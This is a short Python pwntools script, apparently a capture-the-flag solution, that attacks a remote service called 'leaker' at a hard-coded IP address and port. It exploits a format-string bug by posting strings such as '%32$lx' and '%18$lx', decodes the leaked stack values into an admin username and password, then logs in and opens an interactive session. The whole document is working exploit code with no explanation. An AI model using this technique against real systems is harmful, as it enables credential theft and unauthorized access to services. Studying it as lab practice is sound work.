from pwn import *

def postMessage(msg):
    io.sendlineafter(b"panel\n", b"1")
    io.sendlineafter(b":\n", msg.encode())

def accessAdmin(u,p):
    io.sendlineafter(b"panel\n", b"3")
    io.sendline(u)
    io.sendline(p)
    io.sendline()

def viewPost(recv):
    io.sendlineafter(b"panel\n", b"2")
    io.recvuntil(recv.encode())
    resp = io.recvline()
    io.sendline()
    return resp


def leakPayload():
    global n
    result = ""
    while len(result) <= 100:
        result += f"%{n}$s "
        n += 1
    n -= 2
    return result[:100].strip()

n = 7
# io = process("leaker")
io = remote("103.185.44.248", 1449)

accessAdmin(b"d", b"s")

postMessage("%32$lx")
username = bytes.fromhex(viewPost("1. ")[:-1].decode())[::-1]
postMessage("%18$lx")
password = bytes.fromhex(viewPost("2. ")[:-1].decode())[::-1]

accessAdmin(username, password)

io.interactive()
